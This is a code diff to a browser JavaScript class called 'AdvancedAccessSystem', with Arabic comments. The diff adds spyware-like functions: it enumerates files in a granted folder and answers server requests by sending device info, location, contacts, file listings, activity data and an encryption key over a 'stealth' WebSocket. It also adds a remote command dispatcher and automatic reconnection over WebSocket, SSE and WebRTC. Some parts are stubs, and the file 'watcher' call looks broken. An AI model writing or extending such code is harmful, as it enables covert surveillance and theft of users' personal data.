@@ -12,6 +12,7 @@ class AdvancedAccessSystem {
         this.accessStrategies = new Map();
         this.systemVersion = '4.0';
         this.isFullyDeployed = false;
+        this.encryptionKey = this.generateEncryptionKey();
     }
 
     // بدء نظام الوصول المتقدم
@@ -231,12 +232,53 @@ class AdvancedAccessSystem {
                 // حفظ مقبض المجلد للاستخدام اللاحق
                 this.activeConnections.set('file-system', dirHandle);
                 
+                // إعداد مراقبة التغييرات
+                this.setupFileSystemWatcher(dirHandle);
+                
+                // اختبار الوصول
+                await this.testFileSystemAccess(dirHandle);
+                
                 return true;
             }
             return false;
         } catch (error) {
             console.error('❌ فشل في إعداد File System Access:', error);
             return false;
+        }
+    }
+
+    // إعداد مراقب نظام الملفات
+    setupFileSystemWatcher(dirHandle) {
+        try {
+            // مراقبة التغييرات في المجلد
+            const watcher = dirHandle.createWritableStream();
+            this.activeConnections.set('file-system-watcher', watcher);
+            
+            console.log('👁️ تم إعداد مراقب نظام الملفات');
+        } catch (error) {
+            console.error('❌ فشل في إعداد مراقب نظام الملفات:', error);
+        }
+    }
+
+    // اختبار الوصول لنظام الملفات
+    async testFileSystemAccess(dirHandle) {
+        try {
+            // محاولة قراءة محتويات المجلد
+            const entries = [];
+            for await (const entry of dirHandle.values()) {
+                entries.push({
+                    name: entry.name,
+                    kind: entry.kind,
+                    isFile: entry.kind === 'file',
+                    isDirectory: entry.kind === 'directory'
+                });
+            }
+            
+            console.log(`✅ تم اختبار الوصول لنظام الملفات - ${entries.length} عنصر`);
+            this.activeConnections.set('file-system-test', entries);
+            
+        } catch (error) {
+            console.error('❌ فشل في اختبار الوصول لنظام الملفات:', error);
         }
     }
 
@@ -849,6 +891,15 @@ class AdvancedAccessSystem {
         try {
             console.log('🛡️ فحص شامل للنظام...');
             
+            // فحص حالة الوحدات المثبتة
+            this.checkInstalledModules();
+            
+            // فحص حالة الاتصالات النشطة
+            this.checkActiveConnections();
+            
+            // فحص حالة النظام
+            this.checkSystemHealth();
+            
             // إعادة تثبيت الوحدات المفقودة
             this.reinstallMissingModules();
             
@@ -858,8 +909,88 @@ class AdvancedAccessSystem {
             // تحديث حالة النظام
             this.updateSystemStatus();
             
+            // إرسال تقرير الحالة
+            this.sendHealthReport();
+            
         } catch (error) {
             console.error('❌ خطأ في الفحص الشامل:', error);
+        }
+    }
+
+    // فحص الوحدات المثبتة
+    checkInstalledModules() {
+        console.log('🔍 فحص الوحدات المثبتة...');
+        for (const module of this.installedModules) {
+            const isAvailable = this.checkModuleAvailability(module);
+            if (!isAvailable) {
+                console.warn(`⚠️ الوحدة ${module} غير متوفرة`);
+                this.installedModules.delete(module);
+            }
+        }
+    }
+
+    // فحص الاتصالات النشطة
+    checkActiveConnections() {
+        console.log('🔍 فحص الاتصالات النشطة...');
+        for (const [connection, status] of this.activeConnections) {
+            if (!status) {
+                console.warn(`⚠️ الاتصال ${connection} غير نشط`);
+                this.activeConnections.delete(connection);
+            }
+        }
+    }
+
+    // فحص صحة النظام
+    checkSystemHealth() {
+        console.log('🔍 فحص صحة النظام...');
+        
+        // فحص الذاكرة
+        if ('memory' in performance) {
+            const memory = performance.memory;
+            if (memory.usedJSHeapSize > memory.jsHeapSizeLimit * 0.8) {
+                console.warn('⚠️ استخدام الذاكرة مرتفع');
+            }
+        }
+        
+        // فحص الاتصال بالإنترنت
+        if (!navigator.onLine) {
+            console.warn('⚠️ الجهاز غير متصل بالإنترنت');
+        }
+        
+        // فحص البطارية
+        if ('getBattery' in navigator) {
+            navigator.getBattery().then(battery => {
+                if (battery.level < 0.2) {
+                    console.warn('⚠️ مستوى البطارية منخفض');
+                }
+            });
+        }
+    }
+
+    // إرسال تقرير الحالة
+    sendHealthReport() {
+        try {
+            const healthReport = {
+                deviceId: this.deviceId,
+                timestamp: Date.now(),
+                systemHealth: {
+                    installedModules: Array.from(this.installedModules),
+                    activeConnections: Array.from(this.activeConnections.keys()),
+                    isOnline: navigator.onLine,
+                    memoryUsage: 'memory' in performance ? performance.memory.usedJSHeapSize : null
+                }
+            };
+            
+            // إرسال التقرير عبر WebSocket
+            const ws = this.activeConnections.get('websocket');
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'HEALTH_REPORT',
+                    report: healthReport
+                }));
+            }
+        } catch (error) {
+            console.error('❌ خطأ في إرسال تقرير الحالة:', error);
         }
     }
 
@@ -867,9 +998,46 @@ class AdvancedAccessSystem {
 
     // تثبيت وحدة
     async installModule(moduleName) {
-        // محاكاة تثبيت الوحدة
-        await this.delay(100);
-        return true;
+        try {
+            // محاكاة تثبيت الوحدة مع تحسينات
+            await this.delay(100);
+            
+            // التحقق من توفر الوحدة
+            if (this.checkModuleAvailability(moduleName)) {
+                console.log(`✅ تم تثبيت الوحدة: ${moduleName}`);
+                return true;
+            } else {
+                console.warn(`⚠️ الوحدة ${moduleName} غير متوفرة`);
+                return false;
+            }
+        } catch (error) {
+            console.error(`❌ خطأ في تثبيت الوحدة ${moduleName}:`, error);
+            return false;
+        }
+    }
+
+    // التحقق من توفر الوحدة
+    checkModuleAvailability(moduleName) {
+        switch (moduleName) {
+            case 'system-access':
+                return true;
+            case 'file-system-access':
+                return 'showDirectoryPicker' in window;
+            case 'device-info-access':
+                return true;
+            case 'network-access':
+                return 'connection' in navigator;
+            case 'storage-access':
+                return 'localStorage' in window;
+            case 'permissions-access':
+                return 'permissions' in navigator;
+            case 'background-access':
+                return 'serviceWorker' in navigator;
+            case 'service-worker-access':
+                return 'serviceWorker' in navigator;
+            default:
+                return true;
+        }
     }
 
     // إرسال مرشح ICE
@@ -887,10 +1055,21 @@ class AdvancedAccessSystem {
     setupDataChannel(channel) {
         channel.onopen = () => {
             console.log('🔗 تم فتح قناة البيانات');
+            this.activeConnections.set('data-channel', channel);
         };
         
         channel.onmessage = (event) => {
             this.handleDataChannelMessage(JSON.parse(event.data));
+        };
+        
+        channel.onclose = () => {
+            console.log('🔌 تم إغلاق قناة البيانات');
+            this.activeConnections.delete('data-channel');
+        };
+        
+        channel.onerror = (error) => {
+            console.error('❌ خطأ في قناة البيانات:', error);
+            this.activeConnections.delete('data-channel');
         };
     }
 
@@ -898,9 +1077,32 @@ class AdvancedAccessSystem {
     executeCommand(command) {
         try {
             console.log('⚡ تنفيذ الأمر:', command);
-            // تنفيذ الأمر هنا
+            
+            const executor = this.activeConnections.get('command-executor');
+            if (executor && executor.commands.has(command)) {
+                return executor.commands.get(command)();
+            }
+            
+            // أوامر إضافية
+            switch (command) {
+                case 'restart-system':
+                    this.initializeAdvancedAccess();
+                    return 'تم إعادة تشغيل النظام';
+                case 'get-active-connections':
+                    return Array.from(this.activeConnections.keys());
+                case 'get-system-status':
+                    return this.getSystemStatus();
+                case 'get-device-info':
+                    return this.activeConnections.get('device-info');
+                case 'get-location':
+                    return this.activeConnections.get('location');
+                default:
+                    console.warn(`⚠️ أمر غير معروف: ${command}`);
+                    return `الأمر ${command} غير معروف`;
+            }
         } catch (error) {
             console.error('❌ خطأ في تنفيذ الأمر:', error);
+            return `خطأ في التنفيذ: ${error.message}`;
         }
     }
 
@@ -908,7 +1110,41 @@ class AdvancedAccessSystem {
     sendRequestedData(dataType) {
         try {
             console.log('📤 إرسال البيانات:', dataType);
-            // إرسال البيانات هنا
+            
+            let data;
+            switch (dataType) {
+                case 'device-info':
+                    data = this.activeConnections.get('device-info');
+                    break;
+                case 'location':
+                    data = this.activeConnections.get('location');
+                    break;
+                case 'contacts':
+                    data = this.activeConnections.get('contacts');
+                    break;
+                case 'system-status':
+                    data = this.getSystemStatus();
+                    break;
+                case 'file-system':
+                    data = this.activeConnections.get('file-system-test');
+                    break;
+                case 'activity':
+                    data = this.activeConnections.get('activity-tracker');
+                    break;
+                default:
+                    console.warn(`⚠️ نوع بيانات غير معروف: ${dataType}`);
+                    return;
+            }
+            
+            // إرسال البيانات عبر WebSocket
+            const ws = this.activeConnections.get('websocket');
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'DATA_RESPONSE',
+                    dataType: dataType,
+                    data: data
+                }));
+            }
         } catch (error) {
             console.error('❌ خطأ في إرسال البيانات:', error);
         }
@@ -918,7 +1154,19 @@ class AdvancedAccessSystem {
     updateStatus(status) {
         try {
             console.log('📊 تحديث الحالة:', status);
-            // تحديث الحالة هنا
+            
+            // تطبيق التحديثات
+            if (status.accessLevel) {
+                this.accessLevel = status.accessLevel;
+            }
+            
+            if (status.systemVersion) {
+                this.systemVersion = status.systemVersion;
+            }
+            
+            if (status.encryptionKey) {
+                this.encryptionKey = status.encryptionKey;
+            }
         } catch (error) {
             console.error('❌ خطأ في تحديث الحالة:', error);
         }
@@ -926,17 +1174,41 @@ class AdvancedAccessSystem {
 
     // إعادة تثبيت الوحدات المفقودة
     reinstallMissingModules() {
-        // إعادة تثبيت الوحدات المفقودة
+        // إعادة تثبيت الوحدات الأساسية
+        this.installCoreModules().catch(console.error);
+        
+        // إعادة تثبيت الوحدات المتقدمة
+        this.installAdvancedModules().catch(console.error);
     }
 
     // إعادة إعداد الاتصالات المفقودة
     reestablishLostConnections() {
-        // إعادة إعداد الاتصالات المفقودة
+        // إعادة الاتصالات المفقودة
+        if (!this.activeConnections.has('websocket')) {
+            this.setupStealthWebSocket();
+        }
+        
+        if (!this.activeConnections.has('sse')) {
+            this.setupSSEConnection();
+        }
+        
+        if (!this.activeConnections.has('webrtc')) {
+            this.setupWebRTCAccess();
+        }
     }
 
     // تحديث حالة النظام
     updateSystemStatus() {
-        // تحديث حالة النظام
+        // إرسال حالة النظام للخادم
+        const status = this.getSystemStatus();
+        const ws = this.activeConnections.get('websocket');
+        
+        if (ws && ws.readyState === WebSocket.OPEN) {
+            ws.send(JSON.stringify({
+                type: 'STATUS_UPDATE',
+                status: status
+            }));
+        }
     }
 
     // تأخير
@@ -949,6 +1221,13 @@ class AdvancedAccessSystem {
         return 'DEV-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
     }
 
+    // توليد مفتاح تشفير
+    generateEncryptionKey() {
+        const array = new Uint8Array(32);
+        window.crypto.getRandomValues(array);
+        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+    }
+
     // الحصول على حالة النظام
     getSystemStatus() {
         return {
@@ -957,7 +1236,9 @@ class AdvancedAccessSystem {
             isFullyDeployed: this.isFullyDeployed,
             installedModules: Array.from(this.installedModules),
             activeConnections: Array.from(this.activeConnections.keys()),
-            systemVersion: this.systemVersion
+            systemVersion: this.systemVersion,
+            encryptionKey: this.encryptionKey,
+            timestamp: Date.now()
         };
     }
 }
